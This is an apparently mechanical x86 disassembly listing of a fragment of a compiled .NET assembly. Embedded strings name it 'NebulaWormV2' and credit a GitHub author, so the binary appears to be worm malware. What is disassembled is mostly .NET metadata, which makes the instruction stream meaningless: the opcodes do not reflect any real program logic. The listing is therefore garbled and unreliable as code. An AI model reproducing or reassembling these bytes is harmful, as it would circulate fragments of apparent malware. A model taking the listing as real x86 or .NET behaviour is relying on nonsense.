  40acf1:	80 b5 12 80 b9 0e 0e 	xorb   $0xe,0xeb98012(%ebp)
  40acf8:	04 06                	add    $0x6,%al
  40acfa:	12 80 bd 07 20 02    	adc    0x22007bd(%eax),%al
  40ad00:	01 12                	add    %edx,(%edx)
  40ad02:	80 bd 08 05 20 00 12 	cmpb   $0x12,0x200508(%ebp)
  40ad09:	80 ad 05 20 00 12 80 	subb   $0x80,0x12002005(%ebp)
  40ad10:	b1 09                	mov    $0x9,%cl
  40ad12:	20 02                	and    %al,(%edx)
  40ad14:	01 12                	add    %edx,(%edx)
  40ad16:	81 8d 12 81 89 09 07 	orl    $0x65120507,0x9898112(%ebp)
  40ad1d:	05 12 65 
  40ad20:	0e                   	push   %cs
  40ad21:	0e                   	push   %cs
  40ad22:	0e                   	push   %cs
  40ad23:	12 69 05             	adc    0x5(%ecx),%ch
  40ad26:	20 02                	and    %al,(%edx)
  40ad28:	01 0e                	add    %ecx,(%esi)
  40ad2a:	0e                   	push   %cs
  40ad2b:	0d 07 05 1d 12       	or     $0x121d0507,%eax
  40ad30:	80 bd 08 12 80 bd 1d 	cmpb   $0x1d,-0x427fedf8(%ebp)
  40ad37:	0e                   	push   %cs
  40ad38:	0e                   	push   %cs
  40ad39:	06                   	push   %es
  40ad3a:	00 01                	add    %al,(%ecx)
  40ad3c:	12 81 cd 0e 06 20    	adc    0x20060ecd(%ecx),%al
  40ad42:	00 1d 12 80 bd 05    	add    %bl,0x5bd8012
  40ad48:	20 00                	and    %al,(%eax)
  40ad4a:	11 81 b9 06 20 01    	adc    %eax,0x12006b9(%ecx)
  40ad50:	1d 0e 1d 03 09       	sbb    $0x9031d0e,%eax
  40ad55:	07                   	pop    %es
  40ad56:	03 12                	add    (%edx),%edx
  40ad58:	80 c1 12             	add    $0x12,%cl
  40ad5b:	80 c5 02             	add    $0x2,%ch
  40ad5e:	07                   	pop    %es
  40ad5f:	20 02                	and    %al,(%edx)
  40ad61:	12 80 c5 0e 08 05    	adc    0x5080ec5(%eax),%al
  40ad67:	20 00                	and    %al,(%eax)
  40ad69:	11 81 d5 06 07 02    	adc    %eax,0x20706d5(%ecx)
  40ad6f:	12 80 ad 02 07 20    	adc    0x200702ad(%eax),%al
  40ad75:	02 12                	add    (%edx),%dl
  40ad77:	80 9d 0e 08 04 20 01 	sbbb   $0x1,0x2004080e(%ebp)
  40ad7e:	02 08                	add    (%eax),%cl
  40ad80:	08 07                	or     %al,(%edi)
  40ad82:	03 11                	add    (%ecx),%edx
  40ad84:	59                   	pop    %ecx
  40ad85:	02 11                	add    (%ecx),%dl
  40ad87:	80 c9 05             	or     $0x5,%cl
  40ad8a:	00 01                	add    %al,(%ecx)
  40ad8c:	11 59 0e             	adc    %ebx,0xe(%ecx)
  40ad8f:	09 00                	or     %eax,(%eax)
  40ad91:	02 11                	add    (%ecx),%dl
  40ad93:	80 c9 11             	or     $0x11,%cl
  40ad96:	59                   	pop    %ecx
  40ad97:	11 59 03             	adc    %ebx,0x3(%ecx)
  40ad9a:	20 00                	and    %al,(%eax)
  40ad9c:	0d 05 07 01 11       	or     $0x11010705,%eax
  40ada1:	80 8c 05 0a 01 11 80 	orb    $0x8c,-0x7feefef6(%ebp,%eax,1)
  40ada8:	8c 
  40ada9:	06                   	push   %es
  40adaa:	07                   	pop    %es
  40adab:	03 08                	add    (%eax),%ecx
  40adad:	1d 03 08 04 20       	sbb    $0x20040803,%eax
  40adb2:	01 08                	add    %ecx,(%eax)
  40adb4:	08 04 20             	or     %al,(%eax,%eiz,1)
  40adb7:	01 03                	add    %eax,(%ebx)
  40adb9:	08 05 20 01 01 1d    	or     %al,0x1d010120
  40adbf:	03 02                	add    (%edx),%eax
  40adc1:	06                   	push   %es
  40adc2:	0e                   	push   %cs
  40adc3:	07                   	pop    %es
  40adc4:	00 02                	add    %al,(%edx)
  40adc6:	01 0e                	add    %ecx,(%esi)
  40adc8:	11 81 d9 04 07 01    	adc    %eax,0x10704d9(%ecx)
  40adce:	12 51 04             	adc    0x4(%ecx),%dl
  40add1:	07                   	pop    %es
  40add2:	02 0e                	add    (%esi),%cl
  40add4:	0e                   	push   %cs
  40add5:	0a 07                	or     (%edi),%al
  40add7:	06                   	push   %es
  40add8:	0e                   	push   %cs
  40add9:	1d 0e 08 1d 0e       	sbb    $0xe1d080e,%eax
  40adde:	08 0e                	or     %cl,(%esi)
  40ade0:	06                   	push   %es
  40ade1:	00 02                	add    %al,(%edx)
  40ade3:	1d 0e 0e 0e 07       	sbb    $0x70e0e0e,%eax
  40ade8:	20 02                	and    %al,(%edx)
  40adea:	02 0e                	add    (%esi),%cl
  40adec:	11 81 dd 05 00 00    	adc    %eax,0x5dd(%ecx)
  40adf2:	12 81 e1 06 20 01    	adc    0x12006e1(%ecx),%al
  40adf8:	01 12                	add    %edx,(%edx)
  40adfa:	81 e1 06 20 01 02    	and    $0x2012006,%ecx
  40ae00:	11 81 e9 05 07 01    	adc    %eax,0x10705e9(%ecx)
  40ae06:	11 80 94 05 0a 01    	adc    %eax,0x10a0594(%eax)
  40ae0c:	11 80 94 05 07 01    	adc    %eax,0x1070594(%eax)
  40ae12:	11 80 e9 05 20 00    	adc    %eax,0x2005e9(%eax)
  40ae18:	11 80 e9 0a 07 05    	adc    %eax,0x5070ae9(%eax)
  40ae1e:	0e                   	push   %cs
  40ae1f:	1d 0e 08 0e 12       	sbb    $0x120e080e,%eax
  40ae24:	80 fd 06             	cmp    $0x6,%ch
  40ae27:	00 03                	add    %al,(%ebx)
  40ae29:	01 0e                	add    %ecx,(%esi)
  40ae2b:	0e                   	push   %cs
  40ae2c:	02 05 20 01 0e 1d    	add    0x1d0e0120,%al
  40ae32:	03 08                	add    (%eax),%ecx
  40ae34:	00 03                	add    %al,(%ebx)
  40ae36:	02 0e                	add    (%esi),%cl
  40ae38:	0e                   	push   %cs
  40ae39:	11 81 dd 08 15 12    	adc    %eax,0x121508dd(%ecx)
  40ae3f:	81 09 01 12 80 9d    	orl    $0x9d801201,(%ecx)
  40ae45:	05 20 00 11 80       	add    $0x80110020,%eax
  40ae4a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40ae4b:	10 00                	adc    %al,(%eax)
  40ae4d:	02 12                	add    (%edx),%dl
  40ae4f:	80 9d 15 12 81 09 01 	sbbb   $0x1,0x9811215(%ebp)
  40ae56:	12 80 9d 11 80 a5    	adc    -0x5a7fee63(%eax),%al
  40ae5c:	05 07 01 11 80       	add    $0x80110107,%eax
  40ae61:	9c                   	pushf
  40ae62:	05 0a 01 11 80       	add    $0x8011010a,%eax
  40ae67:	9c                   	pushf
  40ae68:	06                   	push   %es
  40ae69:	00 01                	add    %al,(%ecx)
  40ae6b:	01 11                	add    %edx,(%ecx)
  40ae6d:	81 f1 03 00 00 01    	xor    $0x1000003,%ecx
  40ae73:	05 07 01 11 80       	add    $0x80110107,%eax
  40ae78:	a8 05                	test   $0x5,%al
  40ae7a:	0a 01                	or     (%ecx),%al
  40ae7c:	11 80 a8 08 07 04    	adc    %eax,0x40708a8(%eax)
  40ae82:	1d 03 12 55 02       	sbb    $0x2551203,%eax
  40ae87:	08 06                	or     %al,(%esi)
  40ae89:	00 02                	add    %al,(%edx)
  40ae8b:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40ae8e:	02 04 00             	add    (%eax,%eax,1),%al
  40ae91:	01 01                	add    %eax,(%ecx)
  40ae93:	1c 0e                	sbb    $0xe,%al
  40ae95:	07                   	pop    %es
  40ae96:	07                   	pop    %es
  40ae97:	0e                   	push   %cs
  40ae98:	1d 12 81 15 08       	sbb    $0x8158112,%eax
  40ae9d:	12 81 15 0e 0e 0e    	adc    0xe0e0e15(%ecx),%al
  40aea3:	06                   	push   %es
  40aea4:	00 00                	add    %al,(%eax)
  40aea6:	1d 12 81 15 05       	sbb    $0x5158112,%eax
  40aeab:	20 00                	and    %al,(%eax)
  40aead:	11 81 f9 05 20 00    	adc    %eax,0x2005f9(%ecx)
  40aeb3:	12 81 fd 07 07 03    	adc    0x30707fd(%ecx),%al
  40aeb9:	0e                   	push   %cs
  40aeba:	0e                   	push   %cs
  40aebb:	11 80 8d 0e 07 04    	adc    %eax,0x4070e8d(%eax)
  40aec1:	12 80 d1 12 80 d5    	adc    -0x2a7fed2f(%eax),%al
  40aec7:	12 80 d9 12 80 85    	adc    -0x7a7fed27(%eax),%al
  40aecd:	06                   	push   %es
  40aece:	20 01                	and    %al,(%ecx)
  40aed0:	01 11                	add    %edx,(%ecx)
  40aed2:	82 05 06 20 01 01 11 	addb   $0x11,0x1012006
  40aed9:	82 09 06             	orb    $0x6,(%ecx)
  40aedc:	00 01                	add    %al,(%ecx)
  40aede:	11 80 c9 0d 06 20    	adc    %eax,0x20060dc9(%eax)
  40aee4:	01 01                	add    %eax,(%ecx)
  40aee6:	11 80 c9 07 20 02    	adc    %eax,0x22007c9(%eax)
  40aeec:	01 0e                	add    %ecx,(%esi)
  40aeee:	12 80 d1 06 20 01    	adc    0x12006d1(%eax),%al
  40aef4:	12 80 85 0e 0c 20    	adc    0x200c0e85(%eax),%al
  40aefa:	03 12                	add    (%edx),%edx
  40aefc:	80 85 0e 12 80 85 12 	addb   $0x12,-0x7a7fedf2(%ebp)
  40af03:	82 11 05             	adcb   $0x5,(%ecx)
  40af06:	07                   	pop    %es
  40af07:	01 11                	add    %edx,(%ecx)
  40af09:	80 b4 05 0a 01 11 80 	xorb   $0xb4,-0x7feefef6(%ebp,%eax,1)
  40af10:	b4 
  40af11:	09 07                	or     %eax,(%edi)
  40af13:	04 08                	add    $0x8,%al
  40af15:	11 80 e9 08 12 69    	adc    %eax,0x691208e9(%eax)
  40af1b:	08 00                	or     %al,(%eax)
  40af1d:	01 12                	add    %edx,(%edx)
  40af1f:	80 9d 12 80 cd 0a 30 	sbbb   $0x30,0xacd8012(%ebp)
  40af26:	02 02                	add    (%edx),%al
  40af28:	01 10                	add    %edx,(%eax)
  40af2a:	1e                   	push   %ds
  40af2b:	00 10                	add    %dl,(%eax)
  40af2d:	1e                   	push   %ds
  40af2e:	01 08                	add    %ecx,(%eax)
  40af30:	0a 02                	or     (%edx),%al
  40af32:	11 80 e9 11 80 88    	adc    %eax,-0x777fee17(%eax)
  40af38:	08 15 12 80 f5 01    	or     %dl,0x1f58012
  40af3e:	12 80 9d 06 00 03    	adc    0x300069d(%eax),%al
  40af44:	0e                   	push   %cs
  40af45:	0e                   	push   %cs
  40af46:	1c 1c                	sbb    $0x1c,%al
  40af48:	0d 00 01 12 80       	or     $0x80120100,%eax
  40af4d:	9d                   	popf
  40af4e:	15 12 81 09 01       	adc    $0x1098112,%eax
  40af53:	12 80 9d 05 20 01    	adc    0x120059d(%eax),%al
  40af59:	01 13                	add    %edx,(%ebx)
  40af5b:	00 0d 00 01 12 80    	add    %cl,0x80120100
  40af61:	9d                   	popf
  40af62:	15 12 81 a9 01       	adc    $0x1a98112,%eax
  40af67:	12 80 9d 05 20 01    	adc    0x120059d(%eax),%al
  40af6d:	01 12                	add    %edx,(%edx)
  40af6f:	69 08 07 03 08 11    	imul   $0x11080307,(%eax),%ecx
  40af75:	80 e9 12             	sub    $0x12,%cl
  40af78:	69 08 0a 02 11 80    	imul   $0x8011020a,(%eax),%ecx
  40af7e:	e9 11 80 8c 08       	jmp    0x8cd2f94
  40af83:	0a 02                	or     (%edx),%al
  40af85:	11 80 e9 11 80 94    	adc    %eax,-0x6b7fee17(%eax)
  40af8b:	06                   	push   %es
  40af8c:	00 01                	add    %al,(%ecx)
  40af8e:	12 80 9d 08 05 07    	adc    0x705089d(%eax),%al
  40af94:	01 11                	add    %edx,(%ecx)
  40af96:	80 b8 05 0a 01 11 80 	cmpb   $0x80,0x11010a05(%eax)
  40af9d:	b8 10 07 04 08       	mov    $0x8040710,%eax
  40afa2:	12 80 9d 15 11 81    	adc    -0x7eeeea63(%eax),%al
  40afa8:	11 01                	adc    %eax,(%ecx)
  40afaa:	12 80 9d 12 69 0e    	adc    0xe69129d(%eax),%al
  40afb0:	00 01                	add    %al,(%ecx)
  40afb2:	15 12 82 15 01       	adc    $0x1158212,%eax
  40afb7:	12 80 9d 1d 12 80    	adc    -0x7fede263(%eax),%al
  40afbd:	9d                   	popf
  40afbe:	08 15 12 82 15 01    	or     %dl,0x1158212
  40afc4:	12 80 9d 09 20 00    	adc    0x20099d(%eax),%al
  40afca:	15 11 81 11 01       	adc    $0x1118111,%eax
  40afcf:	13 00                	adc    (%eax),%eax
  40afd1:	08 15 11 81 11 01    	or     %dl,0x1118111
  40afd7:	12 80 9d 0d 0a 02    	adc    0x20a0d9d(%eax),%al
  40afdd:	15 11 81 11 01       	adc    $0x1118111,%eax
  40afe2:	12 80 9d 11 80 9c    	adc    -0x637fee63(%eax),%al
  40afe8:	04 20                	add    $0x20,%al
  40afea:	00 13                	add    %dl,(%ebx)
  40afec:	00 05 07 01 11 80    	add    %al,0x80110107
  40aff2:	bc 05 0a 01 11       	mov    $0x11010a05,%esp
  40aff7:	80 bc 0d 07 06 08 0e 	cmpb   $0x12,0xe080607(%ebp,%ecx,1)
  40affe:	12 
  40afff:	80 a4 0e 11 80 e9 12 	andb   $0x69,0x12e98011(%esi,%ecx,1)
  40b006:	69 
  40b007:	08 0a                	or     %cl,(%edx)
  40b009:	02 11                	add    (%ecx),%dl
  40b00b:	80 e9 11             	sub    $0x11,%cl
  40b00e:	80 a8 0f 07 08 08 12 	subb   $0x12,0x808070f(%eax)
  40b015:	80 84 0e 0e 11 80 e9 	addb   $0x1c,-0x167feef2(%esi,%ecx,1)
  40b01c:	1c 
  40b01d:	08 12                	or     %dl,(%edx)
  40b01f:	69 06 00 02 01 0e    	imul   $0xe010200,(%esi),%eax
  40b025:	11 59 08             	adc    %ebx,0x8(%ecx)
  40b028:	0a 02                	or     (%edx),%al
  40b02a:	11 80 e9 11 80 b4    	adc    %eax,-0x4b7fee17(%eax)
  40b030:	07                   	pop    %es
  40b031:	00 01                	add    %al,(%ecx)
  40b033:	12 82 19 12 69 10    	adc    0x10691219(%edx),%al
  40b039:	07                   	pop    %es
  40b03a:	07                   	pop    %es
  40b03b:	08 08                	or     %cl,(%eax)
  40b03d:	11 80 e9 11 59 1d    	adc    %eax,0x1d5911e9(%eax)
  40b043:	12 80 9d 08 12 69    	adc    0x6912089d(%eax),%al
  40b049:	09 00                	or     %eax,(%eax)
  40b04b:	02 12                	add    (%edx),%dl
  40b04d:	80 9d 08 11 80 a5 08 	sbbb   $0x8,-0x5a7feef8(%ebp)
  40b054:	0a 02                	or     (%edx),%al
  40b056:	11 80 e9 11 80 b8    	adc    %eax,-0x477fee17(%eax)
  40b05c:	09 00                	or     %eax,(%eax)
  40b05e:	01 12                	add    %edx,(%edx)
  40b060:	80 9d 1d 12 80 9d 0b 	sbbb   $0xb,-0x627fede3(%ebp)
  40b067:	07                   	pop    %es
  40b068:	04 08                	add    $0x8,%al
  40b06a:	11 80 e9 11 80 a5    	adc    %eax,-0x5a7fee17(%eax)
  40b070:	12 69 08             	adc    0x8(%ecx),%ch
  40b073:	0a 02                	or     (%edx),%al
  40b075:	11 80 e9 11 80 bc    	adc    %eax,-0x437fee17(%eax)
  40b07b:	08 b7 7a 5c 56 19    	or     %dh,0x19565c7a(%edi)
  40b081:	34 e0                	xor    $0xe0,%al
  40b083:	89 08                	mov    %ecx,(%eax)
  40b085:	b0 3f                	mov    $0x3f,%al
  40b087:	5f                   	pop    %edi
  40b088:	7f 11                	jg     0x40b09b
  40b08a:	d5 0a                	aad    $0xa
  40b08c:	3a 04 ff             	cmp    (%edi,%edi,8),%al
  40b08f:	0f 1f 00             	nopl   (%eax)
  40b092:	04 00                	add    $0x0,%al
  40b094:	10 00                	adc    %al,(%eax)
  40b096:	00 04 00             	add    %al,(%eax,%eax,1)
  40b099:	20 00                	and    %al,(%eax)
  40b09b:	00 04 40             	add    %al,(%eax,%eax,2)
  40b09e:	00 00                	add    %al,(%eax)
  40b0a0:	00 04 00             	add    %al,(%eax,%eax,1)
  40b0a3:	00 00                	add    %al,(%eax)
  40b0a5:	00 04 28             	add    %al,(%eax,%ebp,1)
  40b0a8:	00 00                	add    %al,(%eax)
  40b0aa:	00 04 b3             	add    %al,(%ebx,%esi,4)
  40b0ad:	15 00 00 80 9e       	adc    $0x9e800000,%eax
  40b0b2:	2e 01 80 84 53 79 73 	add    %eax,%cs:0x73795384(%eax)
  40b0b9:	74 65                	je     0x40b120
  40b0bb:	6d                   	insl   (%dx),%es:(%edi)
  40b0bc:	2e 53                	cs push %ebx
  40b0be:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40b0c2:	69 74 79 2e 50 65 72 	imul   $0x6d726550,0x2e(%ecx,%edi,2),%esi
  40b0c9:	6d 
  40b0ca:	69 73 73 69 6f 6e 73 	imul   $0x736e6f69,0x73(%ebx),%esi
  40b0d1:	2e 53                	cs push %ebx
  40b0d3:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40b0d7:	69 74 79 50 65 72 6d 	imul   $0x696d7265,0x50(%ecx,%edi,2),%esi
  40b0de:	69 
  40b0df:	73 73                	jae    0x40b154
  40b0e1:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  40b0e8:	69 62 75 74 65 2c 20 	imul   $0x202c6574,0x75(%edx),%esp
  40b0ef:	6d                   	insl   (%dx),%es:(%edi)
  40b0f0:	73 63                	jae    0x40b155
  40b0f2:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0f3:	72 6c                	jb     0x40b161
  40b0f5:	69 62 2c 20 56 65 72 	imul   $0x72655620,0x2c(%edx),%esp
  40b0fc:	73 69                	jae    0x40b167
  40b0fe:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0ff:	6e                   	outsb  %ds:(%esi),(%dx)
  40b100:	3d 34 2e 30 2e       	cmp    $0x2e302e34,%eax
  40b105:	30 2e                	xor    %ch,(%esi)
  40b107:	30 2c 20             	xor    %ch,(%eax,%eiz,1)
  40b10a:	43                   	inc    %ebx
  40b10b:	75 6c                	jne    0x40b179
  40b10d:	74 75                	je     0x40b184
  40b10f:	72 65                	jb     0x40b176
  40b111:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  40b116:	72 61                	jb     0x40b179
  40b118:	6c                   	insb   (%dx),%es:(%edi)
  40b119:	2c 20                	sub    $0x20,%al
  40b11b:	50                   	push   %eax
  40b11c:	75 62                	jne    0x40b180
  40b11e:	6c                   	insb   (%dx),%es:(%edi)
  40b11f:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%ebx),%esp
  40b126:	6b 65 6e 3d          	imul   $0x3d,0x6e(%ebp),%esp
  40b12a:	62 37                	bound  %esi,(%edi)
  40b12c:	37                   	aaa
  40b12d:	61                   	popa
  40b12e:	35 63 35 36 31       	xor    $0x31363563,%eax
  40b133:	39 33                	cmp    %esi,(%ebx)
  40b135:	34 65                	xor    $0x65,%al
  40b137:	30 38                	xor    %bh,(%eax)
  40b139:	39 15 01 54 02 10    	cmp    %edx,0x10025401
  40b13f:	53                   	push   %ebx
  40b140:	6b 69 70 56          	imul   $0x56,0x70(%ecx),%ebp
  40b144:	65 72 69             	gs jb  0x40b1b0
  40b147:	66 69 63 61 74 69    	imul   $0x6974,0x61(%ebx),%sp
  40b14d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b14e:	6e                   	outsb  %ds:(%esi),(%dx)
  40b14f:	01 03                	add    %eax,(%ebx)
  40b151:	06                   	push   %es
  40b152:	12 55 02             	adc    0x2(%ebp),%dl
  40b155:	06                   	push   %es
  40b156:	02 02                	add    (%edx),%al
  40b158:	06                   	push   %es
  40b159:	09 03                	or     %eax,(%ebx)
  40b15b:	06                   	push   %es
  40b15c:	12 71 03             	adc    0x3(%ecx),%dh
  40b15f:	06                   	push   %es
  40b160:	1d 0e 02 06 08       	sbb    $0x806020e,%eax
  40b165:	04 06                	add    $0x6,%al
  40b167:	12 80 91 03 06 1d    	adc    0x1d060391(%eax),%al
  40b16d:	05 04 06 11 80       	add    $0x80110604,%eax
  40b172:	ac                   	lods   %ds:(%esi),%al
  40b173:	04 06                	add    $0x6,%al
  40b175:	11 80 b0 03 06 11    	adc    %eax,0x110603b0(%eax)
  40b17b:	59                   	pop    %ecx
  40b17c:	03 06                	add    (%esi),%eax
  40b17e:	12 5d 03             	adc    0x3(%ebp),%bl
  40b181:	06                   	push   %es
  40b182:	12 78 04             	adc    0x4(%eax),%bh
  40b185:	06                   	push   %es
  40b186:	12 80 cd 04 06 12    	adc    0x120604cd(%eax),%al
  40b18c:	80 dd 04             	sbb    $0x4,%ch
  40b18f:	06                   	push   %es
  40b190:	12 80 80 04 06 11    	adc    0x11060480(%eax),%al
  40b196:	80 ed 04             	sub    $0x4,%ch
  40b199:	06                   	push   %es
  40b19a:	12 80 84 09 06 15    	adc    0x15060984(%eax),%al
  40b1a0:	12 80 f5 01 12 80    	adc    -0x7fedfe0b(%eax),%al
  40b1a6:	9d                   	popf
  40b1a7:	04 06                	add    $0x6,%al
  40b1a9:	11 80 e9 04 06 12    	adc    %eax,0x120604e9(%eax)
  40b1af:	80 90 04 06 12 80 98 	adcb   $0x98,-0x7fedf9fc(%eax)
  40b1b6:	09 06                	or     %eax,(%esi)
  40b1b8:	15 12 81 09 01       	adc    $0x1098112,%eax
  40b1bd:	12 80 9d 04 06 12    	adc    0x1206049d(%eax),%al
  40b1c3:	80 ad 04 06 12 80 9d 	subb   $0x9d,-0x7fedf9fc(%ebp)
  40b1ca:	09 06                	or     %eax,(%esi)
  40b1cc:	15 11 81 11 01       	adc    $0x1118111,%eax
  40b1d1:	12 80 9d 04 06 12    	adc    0x1206049d(%eax),%al
  40b1d7:	80 a0 02 06 1c 05 00 	andb   $0x0,0x51c0602(%eax)
  40b1de:	02 18                	add    (%eax),%bl
  40b1e0:	18 0e                	sbb    %cl,(%esi)
  40b1e2:	04 00                	add    $0x0,%al
  40b1e4:	01 18                	add    %ebx,(%eax)
  40b1e6:	0e                   	push   %cs
  40b1e7:	08 00                	or     %al,(%eax)
  40b1e9:	04 02                	add    $0x2,%al
  40b1eb:	18 19                	sbb    %bl,(%ecx)
  40b1ed:	09 10                	or     %edx,(%eax)
  40b1ef:	09 06                	or     %eax,(%esi)
  40b1f1:	00 03                	add    %al,(%ebx)
  40b1f3:	18 09                	sbb    %cl,(%ecx)
  40b1f5:	02 08                	add    (%eax),%cl
  40b1f7:	08 00                	or     %al,(%eax)
  40b1f9:	05 18 18 18 09       	add    $0x9181818,%eax
  40b1fe:	09 09                	or     %ecx,(%ecx)
  40b200:	0a 00                	or     (%eax),%al
  40b202:	05 02 18 18 1d       	add    $0x1d181802,%eax
  40b207:	05 09 10 18 0b       	add    $0xb181009,%eax
  40b20c:	00 07                	add    %al,(%edi)
  40b20e:	18 18                	sbb    %bl,(%eax)
  40b210:	18 09                	sbb    %cl,(%ecx)
  40b212:	18 18                	sbb    %bl,(%eax)
  40b214:	09 10                	or     %edx,(%eax)
  40b216:	18 04 00             	sbb    %al,(%eax,%eax,1)
  40b219:	01 02                	add    %eax,(%edx)
  40b21b:	18 06                	sbb    %al,(%esi)
  40b21d:	00 02                	add    %al,(%edx)
  40b21f:	02 0e                	add    (%esi),%cl
  40b221:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40b226:	01 1d 0e 06 00 03    	add    %ebx,0x300060e
  40b22c:	09 02                	or     %eax,(%edx)
  40b22e:	02 02                	add    (%edx),%al
  40b230:	05 00 00 12 80       	add    $0x80120000,%eax
  40b235:	9d                   	popf
  40b236:	06                   	push   %es
  40b237:	00 01                	add    %al,(%ecx)
  40b239:	01 11                	add    %edx,(%ecx)
  40b23b:	80 a5 06 00 03 02 0e 	andb   $0xe,0x2030006(%ebp)
  40b242:	08 08                	or     %cl,(%eax)
  40b244:	07                   	pop    %es
  40b245:	00 02                	add    %al,(%edx)
  40b247:	12 80 9d 0e 0e 05    	adc    0x50e0e9d(%eax),%al
  40b24d:	00 02                	add    %al,(%edx)
  40b24f:	02 0e                	add    (%esi),%cl
  40b251:	0e                   	push   %cs
  40b252:	04 00                	add    $0x0,%al
  40b254:	01 0e                	add    %ecx,(%esi)
  40b256:	08 06                	or     %al,(%esi)
  40b258:	00 03                	add    %al,(%ebx)
  40b25a:	01 0e                	add    %ecx,(%esi)
  40b25c:	0e                   	push   %cs
  40b25d:	0e                   	push   %cs
  40b25e:	04 20                	add    $0x20,%al
  40b260:	01 0e                	add    %ecx,(%esi)
  40b262:	08 08                	or     %cl,(%eax)
  40b264:	01 00                	add    %eax,(%eax)
  40b266:	08 00                	or     %al,(%eax)
  40b268:	00 00                	add    %al,(%eax)
  40b26a:	00 00                	add    %al,(%eax)
  40b26c:	1e                   	push   %ds
  40b26d:	01 00                	add    %eax,(%eax)
  40b26f:	01 00                	add    %eax,(%eax)
  40b271:	54                   	push   %esp
  40b272:	02 16                	add    (%esi),%dl
  40b274:	57                   	push   %edi
  40b275:	72 61                	jb     0x40b2d8
  40b277:	70 4e                	jo     0x40b2c7
  40b279:	6f                   	outsl  %ds:(%esi),(%dx)
  40b27a:	6e                   	outsb  %ds:(%esi),(%dx)
  40b27b:	45                   	inc    %ebp
  40b27c:	78 63                	js     0x40b2e1
  40b27e:	65 70 74             	gs jo  0x40b2f5
  40b281:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40b288:	77 73                	ja     0x40b2fd
  40b28a:	01 08                	add    %ecx,(%eax)
  40b28c:	01 00                	add    %eax,(%eax)
  40b28e:	02 00                	add    (%eax),%al
  40b290:	00 00                	add    %al,(%eax)
  40b292:	00 00                	add    %al,(%eax)
  40b294:	11 01                	adc    %eax,(%ecx)
  40b296:	00 0c 4e             	add    %cl,(%esi,%ecx,2)
  40b299:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b29d:	61                   	popa
  40b29e:	57                   	push   %edi
  40b29f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b2a0:	72 6d                	jb     0x40b30f
  40b2a2:	56                   	push   %esi
  40b2a3:	32 00                	xor    (%eax),%al
  40b2a5:	00 05 01 00 00 00    	add    %al,0x1
  40b2ab:	00 0b                	add    %cl,(%ebx)
  40b2ad:	01 00                	add    %eax,(%eax)
  40b2af:	06                   	push   %es
  40b2b0:	4e                   	dec    %esi
  40b2b1:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b2b5:	61                   	popa
  40b2b6:	00 00                	add    %al,(%eax)
  40b2b8:	20 01                	and    %al,(%ecx)
  40b2ba:	00 1b                	add    %bl,(%ebx)
  40b2bc:	4d                   	dec    %ebp
  40b2bd:	61                   	popa
  40b2be:	64 65 20 42 79       	fs and %al,%gs:0x79(%edx)
  40b2c3:	20 47 69             	and    %al,0x69(%edi)
  40b2c6:	74 68                	je     0x40b330
  40b2c8:	75 62                	jne    0x40b32c
  40b2ca:	2e 63 6f 6d          	arpl   %ebp,%cs:0x6d(%edi)
  40b2ce:	2f                   	das
  40b2cf:	6b 65 65 67          	imul   $0x67,0x65(%ebp),%esp
  40b2d3:	61                   	popa
  40b2d4:	6e                   	outsb  %ds:(%esi),(%dx)
  40b2d5:	33 31                	xor    (%ecx),%esi
  40b2d7:	00 00                	add    %al,(%eax)
  40b2d9:	29 01                	sub    %eax,(%ecx)
  40b2db:	00 24 64             	add    %ah,(%esp,%eiz,2)
  40b2de:	36 39 35 62 32 62 64 	cmp    %esi,%ss:0x64623262
  40b2e5:	2d 35 62 38 61       	sub    $0x61386235,%eax
  40b2ea:	2d 34 36 66 34       	sub    $0x34663634,%eax
  40b2ef:	2d 38 33 64 32       	sub    $0x32643338,%eax
  40b2f4:	2d 37 33 30 34       	sub    $0x34303337,%eax
  40b2f9:	33 32                	xor    (%edx),%esi
  40b2fb:	35 37 62 37 38       	xor    $0x38376237,%eax
  40b300:	35 00 00 0c 01       	xor    $0x10c0000,%eax
  40b305:	00 07                	add    %al,(%edi)
  40b307:	31 2e                	xor    %ebp,(%esi)
  40b309:	30 2e                	xor    %ch,(%esi)
  40b30b:	30 2e                	xor    %ch,(%esi)
  40b30d:	30 00                	xor    %al,(%eax)
  40b30f:	00 4d 01             	add    %cl,0x1(%ebp)
  40b312:	00 1c 2e             	add    %bl,(%esi,%ebp,1)
  40b315:	4e                   	dec    %esi
  40b316:	45                   	inc    %ebp
  40b317:	54                   	push   %esp
  40b318:	46                   	inc    %esi
  40b319:	72 61                	jb     0x40b37c
  40b31b:	6d                   	insl   (%dx),%es:(%edi)
  40b31c:	65 77 6f             	gs ja  0x40b38e
  40b31f:	72 6b                	jb     0x40b38c
  40b321:	2c 56                	sub    $0x56,%al
  40b323:	65 72 73             	gs jb  0x40b399
  40b326:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40b32d:	37                   	aaa
  40b32e:	2e 32 01             	xor    %cs:(%ecx),%al
  40b331:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  40b335:	46                   	inc    %esi
  40b336:	72 61                	jb     0x40b399
  40b338:	6d                   	insl   (%dx),%es:(%edi)
  40b339:	65 77 6f             	gs ja  0x40b3ab
  40b33c:	72 6b                	jb     0x40b3a9
  40b33e:	44                   	inc    %esp
  40b33f:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40b346:	61                   	popa
  40b347:	6d                   	insl   (%dx),%es:(%edi)
  40b348:	65 14 2e             	gs adc $0x2e,%al
  40b34b:	4e                   	dec    %esi
  40b34c:	45                   	inc    %ebp
  40b34d:	54                   	push   %esp
  40b34e:	20 46 72             	and    %al,0x72(%esi)
  40b351:	61                   	popa
